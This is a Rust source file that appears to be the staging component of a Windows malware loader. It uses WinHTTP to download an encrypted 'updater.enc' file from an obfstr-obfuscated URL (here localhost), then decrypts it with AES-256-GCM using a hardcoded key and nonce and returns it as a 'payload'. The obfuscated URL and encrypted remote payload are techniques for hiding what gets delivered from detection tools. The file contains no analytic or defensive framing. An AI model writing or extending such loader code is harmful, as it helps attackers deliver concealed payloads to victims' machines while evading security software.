use aes_gcm::{
    Aes256Gcm, Nonce,
    aead::{Aead, KeyInit},
};
use obfstr::obfstr;
use std::ptr;
use windows_sys::Win32::Networking::WinHttp::*;

const KEY: [u8; 32] = [
    0x1f, 0x76, 0x8b, 0xd5, 0x7c, 0xbf, 0x02, 0x1b, 0x25, 0x1d, 0xeb, 0x07, 0x91, 0xd8, 0xc1, 0x97,
    0xa3, 0x4f, 0x9c, 0x2e, 0x11, 0x83, 0x5a, 0x6d, 0x44, 0x90, 0x72, 0x18, 0x3b, 0xe1, 0x55, 0x6c,
];
const NONCE: [u8; 12] = [
    0xee, 0x7d, 0x63, 0x93, 0x6a, 0xc1, 0xf2, 0x86, 0xd8, 0xe4, 0xc5, 0xca,
];

pub fn get_payload() -> Vec<u8> {
    let encrypted_payload = download_payload();

    let cipher = Aes256Gcm::new_from_slice(&KEY).unwrap();

    let decrypted_payload = cipher
        .decrypt(Nonce::from_slice(&NONCE), encrypted_payload.as_ref())
        .unwrap();

    decrypted_payload
}

fn download_payload() -> Vec<u8> {
    unsafe {
        let session = WinHttpOpen(
            ptr::null(),
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            ptr::null(),
            ptr::null(),
            0,
        );

        let url_wide: Vec<u16> = obfstr!("http://127.0.0.1/updater.enc")
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();
        let mut url_parts: URL_COMPONENTS = std::mem::zeroed();
        url_parts.dwStructSize = std::mem::size_of::<URL_COMPONENTS>() as u32;
        url_parts.dwHostNameLength = u32::MAX;
        url_parts.dwUrlPathLength = u32::MAX;

        WinHttpCrackUrl(url_wide.as_ptr(), 0, 0, &mut url_parts);

        let host: Vec<u16> =
            std::slice::from_raw_parts(url_parts.lpszHostName, url_parts.dwHostNameLength as usize)
                .iter()
                .cloned()
                .chain(std::iter::once(0))
                .collect();
        let path: Vec<u16> =
            std::slice::from_raw_parts(url_parts.lpszUrlPath, url_parts.dwUrlPathLength as usize)
                .iter()
                .cloned()
                .chain(std::iter::once(0))
                .collect();

        let connect = WinHttpConnect(session, host.as_ptr(), url_parts.nPort, 0);

        let request = WinHttpOpenRequest(
            connect,
            ptr::null(),
            path.as_ptr(),
            ptr::null(),
            ptr::null(),
            ptr::null(),
            0,
        );

        WinHttpSendRequest(request, ptr::null(), 0, ptr::null_mut(), 0, 0, 0);
        WinHttpReceiveResponse(request, ptr::null_mut());

        let mut buffer = Vec::new();
        let mut temp = vec![0u8; 8192];
        let mut bytes_read = 0;

        loop {
            WinHttpReadData(request, temp.as_mut_ptr() as *mut _, 8192, &mut bytes_read);
            if bytes_read == 0 {
                break;
            }
            buffer.extend_from_slice(&temp[..bytes_read as usize]);
        }

        WinHttpCloseHandle(request);
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);

        buffer
    }
}
